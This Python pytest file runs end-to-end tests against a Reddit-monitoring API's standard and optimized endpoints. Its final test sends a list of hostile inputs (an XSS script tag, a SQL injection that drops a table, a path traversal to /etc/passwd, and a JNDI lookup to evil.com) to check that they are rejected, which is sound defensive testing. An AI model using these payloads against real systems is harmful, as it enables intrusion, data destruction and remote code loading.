# ABOUTME: End-to-end API tests using real Docker containers and actual external APIs
# ABOUTME: Tests all endpoints with "ClaudeAI" subreddit and "Claude Code" topic using real services

import time
from urllib.parse import quote

import httpx
import pytest


class TestStandardAPIEndpoints:
    """Test all standard API endpoints with real services."""

    @pytest.mark.asyncio
    async def test_health_check(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test basic health check endpoint."""
        response = http_client.get(f"{standard_api_url}/")

        assert response.status_code == 200
        data = response.json()
        assert "message" in data or "status" in data

    @pytest.mark.asyncio
    async def test_discover_subreddits_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        test_topic: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test subreddit discovery with real Reddit API."""
        encoded_topic = quote(test_topic)
        response = http_client.get(
            f"{standard_api_url}/discover-subreddits/{encoded_topic}"
        )

        assert response.status_code == 200
        data = response.json()

        # Verify response structure
        assert isinstance(data, list)
        assert len(data) <= 3  # Should return top 3 results

        if data:  # If subreddits were found
            for subreddit in data:
                assert "name" in subreddit
                assert "description" in subreddit
                assert "score" in subreddit
                assert isinstance(subreddit["score"], int | float)
                assert 0 <= subreddit["score"] <= 20  # Score is 1-20 scale

    @pytest.mark.asyncio
    async def test_generate_report_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        test_subreddit: str,
        test_topic: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test report generation with real APIs."""
        encoded_subreddit = quote(test_subreddit)
        encoded_topic = quote(test_topic)

        response = http_client.get(
            f"{standard_api_url}/generate-report/{encoded_subreddit}/{encoded_topic}?store_data=true&include_history=false",
            timeout=120.0,  # Extended timeout for real API calls
        )

        # Should succeed or fail gracefully
        assert response.status_code in [200, 404, 500]

        if response.status_code == 200:
            # Should be markdown content
            assert response.headers.get("content-type") in [
                "text/markdown; charset=utf-8",
                "application/octet-stream",
            ]

            # Content should be non-empty
            content = response.text
            assert len(content) > 0

            # Should contain markdown-like content
            assert any(marker in content for marker in ["#", "##", "###", "*", "-"])

    @pytest.mark.asyncio
    async def test_check_updates_first_run_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        test_subreddit: str,
        test_topic: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test check updates endpoint on first run with real API."""
        encoded_subreddit = quote(test_subreddit)
        encoded_topic = quote(test_topic)

        response = http_client.get(
            f"{standard_api_url}/check-updates/{encoded_subreddit}/{encoded_topic}",
            timeout=120.0,
        )

        # Should succeed or fail gracefully
        assert response.status_code in [200, 404, 500]

        if response.status_code == 200:
            data = response.json()

            # Verify response structure
            assert "new_posts" in data
            assert "updated_posts" in data
            assert "new_comments" in data
            assert "summary" in data

            # First run should have all posts as new
            assert isinstance(data["new_posts"], list)
            assert isinstance(data["updated_posts"], list)
            assert isinstance(data["new_comments"], list)

            # On first run, updated posts may or may not be empty depending on existing data
            # This is acceptable as database may have residual data from previous runs
            assert isinstance(data["updated_posts"], list)

    @pytest.mark.asyncio
    async def test_check_updates_subsequent_run_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        test_subreddit: str,
        test_topic: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test check updates on subsequent run to verify change detection."""
        encoded_subreddit = quote(test_subreddit)
        encoded_topic = quote(test_topic)

        # First run
        first_response = http_client.get(
            f"{standard_api_url}/check-updates/{encoded_subreddit}/{encoded_topic}",
            timeout=120.0,
        )

        if first_response.status_code != 200:
            pytest.skip("First check failed, skipping subsequent run test")

        # Wait a moment for potential changes
        time.sleep(5)

        # Second run
        second_response = http_client.get(
            f"{standard_api_url}/check-updates/{encoded_subreddit}/{encoded_topic}",
            timeout=120.0,
        )

        assert second_response.status_code == 200
        second_data = second_response.json()

        # Second run should have fewer or no new posts
        assert len(second_data["new_posts"]) <= len(first_response.json()["new_posts"])

    @pytest.mark.asyncio
    async def test_history_endpoint_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        test_subreddit: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test history endpoint after generating some data."""
        encoded_subreddit = quote(test_subreddit)

        # First generate some data
        check_response = http_client.get(
            f"{standard_api_url}/check-updates/{encoded_subreddit}/test", timeout=120.0
        )

        if check_response.status_code != 200:
            pytest.skip("Could not generate test data for history endpoint")

        # Now test history endpoint
        response = http_client.get(
            f"{standard_api_url}/history/{encoded_subreddit}?page=1&limit=20"
        )

        assert response.status_code == 200
        data = response.json()

        # Verify response structure
        assert "checks" in data
        assert "pagination" in data
        assert isinstance(data["checks"], list)

    @pytest.mark.asyncio
    async def test_trends_endpoint_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        test_subreddit: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test trends endpoint after generating some data."""
        encoded_subreddit = quote(test_subreddit)

        # First generate some data
        check_response = http_client.get(
            f"{standard_api_url}/check-updates/{encoded_subreddit}/test", timeout=120.0
        )

        if check_response.status_code != 200:
            pytest.skip("Could not generate test data for trends endpoint")

        # Now test trends endpoint
        response = http_client.get(
            f"{standard_api_url}/trends/{encoded_subreddit}?days=7"
        )

        assert response.status_code == 200
        data = response.json()

        # Verify response structure
        assert "trend_data" in data
        assert "subreddit" in data

    @pytest.mark.asyncio
    async def test_debug_relevance_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        test_topic: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test relevance scoring debug endpoint."""
        encoded_topic = quote(test_topic)

        response = http_client.get(
            f"{standard_api_url}/debug/relevance/{encoded_topic}"
        )

        # Should succeed or fail gracefully
        assert response.status_code in [200, 404, 500]

        if response.status_code == 200:
            data = response.json()
            assert "topic" in data
            assert "results" in data

    @pytest.mark.asyncio
    async def test_debug_reddit_api_real_api(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test Reddit API connectivity debug endpoint."""
        response = http_client.get(f"{standard_api_url}/debug/reddit-api")

        # Should succeed or fail gracefully
        assert response.status_code in [200, 500]

        if response.status_code == 200:
            data = response.json()
            assert "config_status" in data or "client_info" in data


class TestOptimizedAPIEndpoints:
    """Test optimized API endpoints with real services."""

    @pytest.mark.asyncio
    async def test_optimized_health_check(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test optimized API health check."""
        response = http_client.get(f"{optimized_api_url}/")

        assert response.status_code == 200
        data = response.json()

        # Optimized API should include message info
        assert "message" in data or "status" in data or "version" in data

    @pytest.mark.asyncio
    async def test_performance_stats_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test performance statistics endpoint."""
        response = http_client.get(f"{optimized_api_url}/performance/stats")

        assert response.status_code == 200
        data = response.json()

        # Verify performance metrics structure
        assert "performance" in data
        assert "cache" in data
        assert "timestamp" in data

    @pytest.mark.asyncio
    async def test_performance_report_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test performance report endpoint."""
        response = http_client.get(f"{optimized_api_url}/performance/report")

        assert response.status_code == 200
        data = response.json()

        # Verify detailed performance report structure
        assert "summary" in data
        assert "recent_metrics" in data or "detailed_metrics" in data

    @pytest.mark.asyncio
    async def test_performance_reset_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test performance counters reset endpoint."""
        response = http_client.post(f"{optimized_api_url}/performance/reset")

        assert response.status_code == 200
        data = response.json()

        assert "message" in data
        assert "reset" in data["message"].lower()

    @pytest.mark.asyncio
    async def test_optimized_check_updates_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        test_subreddit: str,
        test_topic: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test optimized check updates endpoint."""
        encoded_subreddit = quote(test_subreddit)
        encoded_topic = quote(test_topic)

        response = http_client.get(
            f"{optimized_api_url}/check-updates/{encoded_subreddit}/{encoded_topic}",
            timeout=120.0,
        )

        # Should succeed or fail gracefully
        assert response.status_code in [200, 404, 500]

        if response.status_code == 200:
            data = response.json()

            # Same structure as standard API but potentially faster
            assert "new_posts" in data
            assert "updated_posts" in data
            assert "new_comments" in data

    @pytest.mark.asyncio
    async def test_trending_posts_optimized_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        test_subreddit: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test optimized trending posts endpoint."""
        encoded_subreddit = quote(test_subreddit)

        response = http_client.get(f"{optimized_api_url}/trending/{encoded_subreddit}")

        # Should succeed or fail gracefully
        assert response.status_code in [200, 404, 500]

        if response.status_code == 200:
            data = response.json()
            assert "trending_posts" in data

    @pytest.mark.asyncio
    async def test_analytics_endpoint_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        test_subreddit: str,
        clean_database: None,
        api_rate_limit_delay: None,
    ) -> None:
        """Test subreddit analytics endpoint."""
        encoded_subreddit = quote(test_subreddit)

        response = http_client.get(f"{optimized_api_url}/analytics/{encoded_subreddit}")

        # Should succeed or fail gracefully
        assert response.status_code in [200, 404, 500]

        if response.status_code == 200:
            data = response.json()
            assert "analytics" in data

    @pytest.mark.asyncio
    async def test_database_optimization_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test database optimization endpoint."""
        response = http_client.post(f"{optimized_api_url}/optimize-database")

        assert response.status_code == 200
        data = response.json()

        assert "optimization_result" in data
        # Check if optimization was successful or handled gracefully
        assert "success" in data["optimization_result"]

    @pytest.mark.asyncio
    async def test_optimized_discover_subreddits_real_api(
        self,
        http_client: httpx.Client,
        optimized_api_url: str,
        test_topic: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test optimized subreddit discovery."""
        encoded_topic = quote(test_topic)

        response = http_client.get(
            f"{optimized_api_url}/discover-subreddits/{encoded_topic}"
        )

        # Should succeed or fail gracefully
        assert response.status_code in [200, 404, 500]

        if response.status_code == 200:
            data = response.json()

            # Should have enhanced structure with caching info
            assert "subreddits" in data or isinstance(data, list)


class TestCrossAPIConsistency:
    """Test consistency between standard and optimized APIs."""

    @pytest.mark.asyncio
    async def test_discover_subreddits_consistency(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        optimized_api_url: str,
        test_topic: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test that both APIs return consistent subreddit discovery results."""
        encoded_topic = quote(test_topic)

        # Call both APIs
        standard_response = http_client.get(
            f"{standard_api_url}/discover-subreddits/{encoded_topic}"
        )
        time.sleep(2)  # Rate limit delay
        optimized_response = http_client.get(
            f"{optimized_api_url}/discover-subreddits/{encoded_topic}"
        )

        # Both should succeed or both should fail consistently
        if (
            standard_response.status_code == 200
            and optimized_response.status_code == 200
        ):
            standard_data = standard_response.json()
            optimized_data = optimized_response.json()

            # Extract subreddits from potentially different response formats
            standard_subreddits = (
                standard_data
                if isinstance(standard_data, list)
                else standard_data.get("subreddits", [])
            )
            optimized_subreddits = (
                optimized_data
                if isinstance(optimized_data, list)
                else optimized_data.get("subreddits", [])
            )

            # Should find similar subreddits (allowing for some variance due to caching)
            if standard_subreddits and optimized_subreddits:
                standard_names = {s["name"] for s in standard_subreddits}
                optimized_names = {s["name"] for s in optimized_subreddits}

                # At least some overlap expected
                overlap = standard_names.intersection(optimized_names)
                assert (
                    len(overlap) > 0
                ), "No overlap between standard and optimized API results"


class TestErrorHandling:
    """Test error handling with real API failures."""

    @pytest.mark.asyncio
    async def test_invalid_subreddit_handling(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test handling of invalid subreddit names."""
        # Use a clearly invalid subreddit name
        invalid_subreddit = "ThisSubredditDefinitelyDoesNotExist12345"

        response = http_client.get(
            f"{standard_api_url}/check-updates/{invalid_subreddit}/test", timeout=60.0
        )

        # Should handle gracefully - either 404 or 200 with empty results
        assert response.status_code in [200, 404, 422, 500]

    @pytest.mark.asyncio
    async def test_malicious_input_rejection(
        self,
        http_client: httpx.Client,
        standard_api_url: str,
        api_rate_limit_delay: None,
    ) -> None:
        """Test that malicious inputs are properly rejected."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]

        for malicious_input in malicious_inputs:
            encoded_input = quote(malicious_input)

            response = http_client.get(
                f"{standard_api_url}/discover-subreddits/{encoded_input}"
            )

            # Should reject malicious input or handle gracefully
            assert response.status_code in [400, 404, 422, 500]

            # Should not return the malicious input in response
            if response.status_code != 500:  # Don't check error details for 500s
                response_text = response.text.lower()
                assert "script" not in response_text
                assert "drop table" not in response_text
